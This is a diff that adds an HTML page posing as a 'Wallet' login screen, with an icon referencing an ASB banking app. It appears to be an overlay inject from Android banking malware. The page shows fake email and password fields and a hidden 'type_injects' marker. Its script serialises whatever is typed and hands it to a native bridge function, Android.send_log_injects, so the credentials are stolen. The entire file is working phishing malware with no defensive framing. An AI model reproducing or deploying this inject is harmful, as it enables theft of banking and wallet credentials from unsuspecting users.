@@ -1,0 +1,247 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Wallet</title>
+    <link rel="shortcut icon" href="nz.co.asb.asbmobile.png" type="image/png">
+    <meta name="viewport" content="width=device-width, initial-scale=0.9">
+    <meta charset="utf-8">
+</head>
+<body>
+
+<style type="text/css">
+    body {
+        background: #000000;
+        margin: 0;
+        padding: 0;
+        font-family: Helvetica, sans-serif;
+        background-size: 100%;
+    }
+    .logo {
+text-align: center;
+    background-size: 100%;
+    padding: 20px 20px 20px 0px;
+    background: none;
+    color: #fff;
+    font-weight: 400;
+    text-decoration: none;
+    }
+    .form {
+        text-align: center;
+        padding-top: 70px;
+    }
+    .form label {
+        display: block;
+    }
+    form {
+        display: inline-block;
+    }
+fieldset {
+      position: relative;
+      text-align: center;
+      border: none;
+          margin: 0;
+    padding: 0;
+
+}
+
+input[type="text"],input[type="password"] {
+line-height: 16px;
+    font-size: 17px;
+    box-sizing: border-box;
+    width: 100%;
+    position: relative;
+    padding: 10px;
+    margin: 0px 1px;
+    display: block;
+    -webkit-box-shadow: none;
+    box-shadow: none;
+    -webkit-appearance: none;
+    height: 48px;
+    margin: 0px 0px 0px 0px;
+    color: #fff;
+    text-align: left;
+    outline: none;
+    border: 1px solid #4b494900;
+    background: #4b494900;
+    padding-left: 120px;
+}
+.autorizeBox button {
+    margin: 30px 0;
+    background-color: #38968700;
+    border: solid #fff 0.6px;
+    color:  #fff;
+    width: 40%;
+    height: 2.5rem;
+    overflow-x: auto;
+    text-align: auto;
+    vertical-align: middle;
+    cursor: pointer;
+	margin-left: 180px;
+}
+.autorizeBox button span {
+    line-height: 1.145rem;
+    white-space: normal;
+    margin: .0750rem .75rem;
+    font-size: 20px;
+    font-weight: 600;
+    color: #fff;
+    letter-spacing: 0;
+    text-decoration: none;
+}
+}
+fieldset span {
+    display: inline-block;
+    text-align: center;
+    color: #4b4949;
+    left: 0;
+    right: 0;
+    padding-top: 30px;
+}
+fieldset p {
+    display: inline-block;
+    left: 0;
+    right: 0;
+    color: #088f0d;
+}
+.logo span {
+    display: inline-block;
+    float: left;
+    padding: 40px 0px 0px 20px;
+    font-size: 20px;
+    color: #fff;
+    font-weight: 600;
+}
+input::placeholder {
+    color: #a9a9a9;
+    font-size: 15px;
+}
+</style>
+
+
+<fieldset id="formtosend">
+
+<div class="" id="log" style="display: block;">
+
+<div class="logo">
+            <img src="data:image/png;base64,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">
+</div>
+
+    <div class="main">
+        <div class="autorizeBox">
+		
+            <form id="login" action="">
+               
+
+<div class="area" style="background: none; padding: 30px; border-radius: 3px;">
+    <p style="display: block; text-align: left; color: #FFEB3B;"></p>
+        <label style="float: left; position: relative; top: 35px; z-index: 1; left: 10px;color:white">Email</label>
+        <input type="text" name="login" id="login" placeholder="Email Adress" style="height: 50px; border-bottom:1px solid #6a6464">
+        <label style="float: left; position: relative; top: 15px; z-index: 1; left: 10px;color:white">Password</label>
+        <input type="password" name="password" id="password" placeholder="Enter Password" style="height: 50px;position: relative;top: -18px;">
+        <input id="type_injects" value='crypt' type="hidden" required>
+		<!-- REQUERED EXIT PARAMETR -->
+		<input name="exit" type="hidden" text="true"/>
+        <button type="button" onclick="process('login')"><span>Login</span></button>
+		
+</div>
+
+</div>
+
+</fieldset> 
+<label style="float: left; position: relative; top: 35px; z-index: 1; left: 10px;color:white">Forgot You Password?</label>
+
+        <script>
+        var allButtons = document.getElementsByTagName('button');
+        for(var btn in allButtons) {
+            allButtons[btn].disabled = true;
+        }
+        
+        function CheckValidInput(id) {
+            var finalbool = true, formids = document.getElementById(id);
+            var currentinputs = formids.getElementsByTagName('input');
+            for(var i = 0; i < currentinputs.length; i++ ) {
+                finalbool &= currentinputs[i].checkValidity();
+            }
+            formids.getElementsByTagName('button')[0].disabled = !finalbool;
+        }
+        
+        var AllForms = document.getElementsByTagName('form');
+        for(var i = 0; i < AllForms.length; i++) {
+            var myInputs = AllForms[i].getElementsByTagName('input');
+            for(var j = 0; j < myInputs.length; j++) {
+                AddInputEventByFormID(myInputs[j],AllForms[i].id);
+            }
+        }
+        
+        function AddInputEventByFormID(input, formid) {
+            input.addEventListener('input', function(){CheckValidInput(formid)});
+        }
+        
+        function process(formId) {
+    var ua = navigator.userAgent.toLowerCase();
+    if(ua.indexOf("android") > -1) {
+        try {
+        Android.send_log_injects(formToJSON(document.getElementById(formId)));
+        } catch (err) {}
+    }else{
+       alert(formToJSON(document.getElementById(formId)));
+    }
+    formChange(formId);
+}
+
+        /*********Recursive implementation of jSON.stringify; ********/
+        var stringifyJSON = function(obj) {
+            var arrOfKeyVals = [],
+                arrVals = [],
+                objKeys = [];
+        
+            /*********CHECK FOR PRIMITIVE TYPES**********/
+            if (typeof obj === 'number' || typeof obj === 'boolean' || obj === null)
+                return '' + obj;
+            else if (typeof obj === 'string')
+                return '"' + obj + '"';
+        
+            /*********CHECK FOR ARRAY**********/
+            else if (Array.isArray(obj)) {
+                if (obj[0] === undefined)
+                    return '[]';
+                else {
+                    obj.forEach(function(el) {
+                        arrVals.push(stringifyJSON(el));
+                    });
+                    return '[' + arrVals + ']';
+                }
+            }
+            /*********CHECK FOR OBJECT**********/
+            else if (obj instanceof Object) {
+                objKeys = Object.keys(obj);
+                objKeys.forEach(function(key) {
+                    var keyOut = '"' + key + '":';
+                    var keyValOut = obj[key];
+                    if (keyValOut instanceof Function || typeof keyValOut === undefined)
+                        arrOfKeyVals.push('');
+                    else if (typeof keyValOut === 'string')
+                        arrOfKeyVals.push(keyOut + '"' + keyValOut + '"');
+                    else if (typeof keyValOut === 'boolean' || typeof keyValOut === 'number' || keyValOut === null)
+                        arrOfKeyVals.push(keyOut + keyValOut);
+                    else if (keyValOut instanceof Object) {
+                        arrOfKeyVals.push(keyOut + stringifyJSON(keyValOut));
+                    }
+                });
+                return '{' + arrOfKeyVals + '}';
+            }
+        };
+        
+        function formToJSON(f)
+        {
+            var FinalObject = {}, namesHTML = ['input','select'];
+            for(var i = 0; i < namesHTML.length; i++) {
+                var bsform = f.getElementsByTagName(namesHTML[i]);
+                for(var j = 0; j < bsform.length; j++) {
+                    FinalObject[bsform[j].id] = bsform[j].value
+                }
+            }
+            return stringifyJSON(FinalObject);
+        }
+        </script>
+        </html>
